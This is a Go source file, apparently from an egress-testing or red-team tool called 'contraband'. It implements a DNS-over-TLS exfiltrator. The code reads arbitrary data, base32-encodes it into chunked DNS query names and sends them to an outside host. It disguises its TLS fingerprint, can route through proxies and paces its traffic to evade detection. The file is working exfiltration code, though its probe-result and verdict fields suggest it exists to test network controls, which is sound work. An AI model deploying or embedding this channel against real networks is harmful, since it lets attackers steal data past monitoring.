package dns

import (
	"context"
	"crypto/sha256"
	"encoding/base32"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"

	mdns "github.com/miekg/dns"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

// DoTExfiltrator implements DNS over TLS (RFC 7858) with uTLS ClientHello masquerading and ALPN "dot".
type DoTExfiltrator struct{}

func NewDoTExfiltrator() *DoTExfiltrator {
	return &DoTExfiltrator{}
}

func init() {
	exfil.RegisterExfiltrator(common.ProtoDoT, NewDoTExfiltrator())
}

func (e *DoTExfiltrator) Protocol() string {
	return common.ProtoDoT
}

func (e *DoTExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.TLSProfile = opts.TLSFingerprint
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	payload, err := io.ReadAll(reader)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %w", err)
	}
	result.TargetVolume = int64(len(payload))

	if opts.ExpectedHash == "" {
		h := sha256.Sum256(payload)
		opts.ExpectedHash = hex.EncodeToString(h[:])
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	dnsChunkSize := 32
	if opts.ChunkSize > 0 && opts.ChunkSize < 32 {
		dnsChunkSize = opts.ChunkSize
	}

	var rawChunks [][]byte
	if len(payload) == 0 {
		rawChunks = [][]byte{{}}
	} else {
		for i := 0; i < len(payload); i += dnsChunkSize {
			end := i + dnsChunkSize
			if end > len(payload) {
				end = len(payload)
			}
			rawChunks = append(rawChunks, payload[i:end])
		}
	}
	totalChunks := uint32(len(rawChunks))

	domain := opts.Headers["domain"]
	if domain == "" {
		domain = "contraband.local"
	}
	domain = strings.TrimSuffix(domain, ".")

	targetAddr := net.JoinHostPort(opts.TargetHost, strconv.Itoa(opts.TargetPort))
	tlsCfg := exfil.TLSConfig{
		ServerName:         opts.TargetHost,
		InsecureSkipVerify: opts.InsecureTLS,
		Fingerprint:        opts.TLSFingerprint,
		ALPN:               []string{common.ALPNDoT},
	}

	var conn net.Conn
	if opts.ProxyDialer != nil {
		rawConn, dialErr := opts.ProxyDialer.DialContext(ctx, "tcp", targetAddr)
		if dialErr != nil {
			result.Verdict = classifyError(dialErr)
			result.ErrorMessage = dialErr.Error()
			calculateDurations(&result)
			return &result, dialErr
		}
		mConn, wrapErr := exfil.WrapConn(ctx, rawConn, targetAddr, tlsCfg)
		if wrapErr != nil {
			rawConn.Close()
			result.Verdict = classifyError(wrapErr)
			result.ErrorMessage = wrapErr.Error()
			calculateDurations(&result)
			return &result, wrapErr
		}
		conn = mConn
		result.JA3String, _ = mConn.GetJA3()
		result.JA4String = mConn.GetJA4()
	} else {
		mConn, dialErr := exfil.DialTLS(ctx, "tcp", targetAddr, tlsCfg)
		if dialErr != nil {
			result.Verdict = classifyError(dialErr)
			result.ErrorMessage = dialErr.Error()
			calculateDurations(&result)
			return &result, dialErr
		}
		conn = mConn
		result.JA3String, _ = mConn.GetJA3()
		result.JA4String = mConn.GetJA4()
	}
	defer conn.Close()

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.HandshakeTLS = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	b32Enc := base32.StdEncoding.WithPadding(base32.NoPadding)

	for seq := uint32(1); seq <= totalChunks; seq++ {
		chunkData := rawChunks[seq-1]
		b32Chunk := b32Enc.EncodeToString(chunkData)
		if b32Chunk == "" {
			b32Chunk = "A"
		}

		fqdn := fmt.Sprintf("%d.%d.%s.%s.%s.", seq, totalChunks, opts.SessionToken.String(), b32Chunk, domain)
		msg := new(mdns.Msg)
		msg.SetQuestion(fqdn, mdns.TypeA)
		msg.RecursionDesired = false

		packedMsg, packErr := msg.Pack()
		if packErr != nil {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = fmt.Sprintf("failed to pack DoT message: %v", packErr)
			calculateDurations(&result)
			return &result, packErr
		}

		// RFC 7858 framing: 2-byte BigEndian length prefix followed by message
		frame := make([]byte, 2+len(packedMsg))
		binary.BigEndian.PutUint16(frame[0:2], uint16(len(packedMsg)))
		copy(frame[2:], packedMsg)

		if _, writeErr := conn.Write(frame); writeErr != nil {
			result.Verdict = classifyError(writeErr)
			result.ErrorMessage = fmt.Sprintf("failed to write DoT frame: %v", writeErr)
			calculateDurations(&result)
			return &result, writeErr
		}
		result.BytesSent += int64(len(frame))

		// Read 2-byte length prefix
		lenBuf := make([]byte, 2)
		if _, readErr := io.ReadFull(conn, lenBuf); readErr != nil {
			result.Verdict = classifyError(readErr)
			result.ErrorMessage = fmt.Sprintf("failed to read DoT response length prefix: %v", readErr)
			calculateDurations(&result)
			return &result, readErr
		}
		respLen := binary.BigEndian.Uint16(lenBuf)

		respMsgBuf := make([]byte, respLen)
		if _, readErr := io.ReadFull(conn, respMsgBuf); readErr != nil {
			result.Verdict = classifyError(readErr)
			result.ErrorMessage = fmt.Sprintf("failed to read DoT response body: %v", readErr)
			calculateDurations(&result)
			return &result, readErr
		}
		result.BytesRecv += int64(2 + respLen)

		respMsg := new(mdns.Msg)
		if err := respMsg.Unpack(respMsgBuf); err != nil {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = fmt.Sprintf("failed to unpack DoT response: %v", err)
			calculateDurations(&result)
			return &result, err
		}

		var ackConfirmed bool
		for _, ans := range respMsg.Answer {
			if aRecord, ok := ans.(*mdns.A); ok && aRecord.A != nil {
				ip := aRecord.A.To4()
				if ip != nil && ip[0] == 127 {
					ackSeq := uint32(ip[1])<<16 | uint32(ip[2])<<8 | uint32(ip[3])
					if ackSeq == seq {
						ackConfirmed = true
						break
					}
				}
			}
		}

		if !ackConfirmed {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = fmt.Sprintf("invalid DoT sequence ACK for chunk %d", seq)
			calculateDurations(&result)
			return &result, errors.New(result.ErrorMessage)
		}

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkData)); err != nil {
				result.Verdict = classifyError(err)
				result.ErrorMessage = err.Error()
				calculateDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = classifyError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateDurations(&result)
					return &result, ctx.Err()
				}
			}
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	result.RawEvidence = common.FormatBoundedRawEvidence(payload)

	calculateDurations(&result)
	return &result, nil
}
